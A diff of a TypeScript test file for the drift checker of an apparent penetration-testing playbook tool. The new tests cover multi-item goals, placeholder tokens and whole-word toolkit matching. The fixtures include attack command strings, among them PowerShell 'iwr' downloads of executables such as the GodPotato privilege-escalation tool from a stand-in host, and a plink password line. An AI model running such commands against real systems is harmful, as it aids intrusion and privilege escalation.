@@ -7,8 +7,8 @@ import type { LibraryCommand } from '../../../engines/library/types';
 
 const F = '04 - Privilege Escalation.md';
 const item = (text: string, file = `01-Playbook/${F}`): PlaybookItem => ({ file, text });
-const goal = (id: string, playbook?: { file: string; text: string }): ChecklistGoal => ({
-  id, stage: 's', title: id, ...(playbook ? { playbook } : {}),
+const goal = (id: string, ...playbook: { file: string; text: string }[]): ChecklistGoal => ({
+  id, stage: 's', title: id, ...(playbook.length ? { playbook } : {}),
 });
 const cmd = (id: string, template: string, source: LibraryCommand['source'] = 'field-manual'): LibraryCommand => ({
   id, title: id, tool: 'x', template, os: 'any', runFrom: 'attacker', goals: [], source,
@@ -22,6 +22,17 @@ describe('computeDrift', () => {
   it('an unmapped playbook item is noStep', () => {
     const d = computeDrift([goal('g1', { file: F, text: 'Capabilities' })], [item('Capabilities'), item('Kernel exploits')], [], [], []);
     expect(d.noStep.map((i) => i.text)).toEqual(['Kernel exploits']);
+  });
+
+  it('a goal can claim several items', () => {
+    const d = computeDrift(
+      [goal('g1', { file: F, text: 'A' }, { file: F, text: 'B' }, { file: F, text: 'Old B' })],
+      [item('A'), item('B'), item('C')],
+      [], [], [],
+    );
+    expect(d.noStep.map((i) => i.text)).toEqual(['C']);
+    expect(d.reworded).toEqual([{ goalId: 'g1', text: 'Old B' }]);
+    expect(d.ravenOnlySteps).toEqual([]);
   });
 
   it('matching also needs the file, not only the text', () => {
@@ -61,6 +72,14 @@ describe('computeDrift', () => {
     ]);
   });
 
+  it('FILL_ tokens are manual', () => {
+    const d = computeDrift([], [], [cmd('a', 'plink -pw {FILL_KALI_PASS} {FILL_ANYTHING}')], [], []);
+    expect(d.unfillable).toEqual([
+      { token: 'FILL_ANYTHING', count: 1, manual: true },
+      { token: 'FILL_KALI_PASS', count: 1, manual: true },
+    ]);
+  });
+
   it('a raven-source command is a ravenOnlyCommand', () => {
     const d = computeDrift(
       [], [],
@@ -78,5 +97,13 @@ describe('computeDrift', () => {
     ];
     const d = computeDrift([], [], [], [card(['iwr http://x/a.exe -o a.exe'])], toolkit);
     expect(d.toolkitUnused).toEqual(['b.exe']);
+  });
+
+  it('toolkit names match whole words, not substrings', () => {
+    const toolkit = ['GodPotato-NET4.exe', 'GodPotato-NET40.exe'].map((file) => ({
+      os: 'windows' as const, purpose: 'p', file, note: '', where: '', staged: true,
+    }));
+    const d = computeDrift([], [], [], [card(['iwr http://x/GodPotato-NET40.exe -o gp.exe'])], toolkit);
+    expect(d.toolkitUnused).toEqual(['GodPotato-NET4.exe']);
   });
 });
